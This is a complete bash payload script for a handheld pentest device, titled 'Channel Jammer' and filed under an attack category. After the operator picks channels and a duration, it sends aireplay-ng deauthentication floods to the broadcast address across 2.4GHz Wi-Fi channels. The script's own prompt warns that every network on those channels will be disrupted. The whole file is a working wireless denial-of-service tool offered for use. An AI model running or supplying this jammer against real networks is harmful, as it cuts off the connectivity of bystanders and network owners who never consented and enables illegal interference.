#!/bin/bash
# Title: Channel Jammer
# Author: NullSec
# Description: Disrupt WiFi across channels using deauth
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/jammer"
mkdir -p "$LOOT_DIR"

PROMPT "CHANNEL JAMMER

Disrupt WiFi on selected
channels using deauth.

Modes:
1. Single channel
2. Channel range
3. All 2.4GHz
4. All 5GHz

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

PROMPT "JAMMING MODE:

1. All 2.4GHz (1-11)
2. Low channels (1-6)
3. High channels (6-11)
4. Single channel

Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

case $MODE in
    1) CHANNELS="1 2 3 4 5 6 7 8 9 10 11" ;;
    2) CHANNELS="1 2 3 4 5 6" ;;
    3) CHANNELS="6 7 8 9 10 11" ;;
    4)
        SINGLE_CH=$(NUMBER_PICKER "Channel (1-11):" 6)
        CHANNELS="$SINGLE_CH"
        ;;
esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START JAMMING?

Channels: $CHANNELS
Duration: ${DURATION}s

All networks on these
channels will be disrupted.

Press OK to jam.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Jamming channels: $CHANNELS"
LOG_FILE="$LOOT_DIR/jam_$(date +%Y%m%d_%H%M).log"

END_TIME=$(($(date +%s) + DURATION))
CYCLES=0

while [ $(date +%s) -lt $END_TIME ]; do
    for CH in $CHANNELS; do
        [ $(date +%s) -ge $END_TIME ] && break
        iwconfig "$MON_IF" channel $CH 2>/dev/null
        aireplay-ng -0 10 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null &
        echo "$(date +%H:%M:%S) JAM CH:$CH" >> "$LOG_FILE"
        sleep 2
        killall aireplay-ng 2>/dev/null
    done
    CYCLES=$((CYCLES + 1))
done

killall aireplay-ng 2>/dev/null

PROMPT "JAMMING COMPLETE

Channels: $CHANNELS
Cycles: $CYCLES
Duration: ${DURATION}s
Log: $LOG_FILE

Press OK to exit."
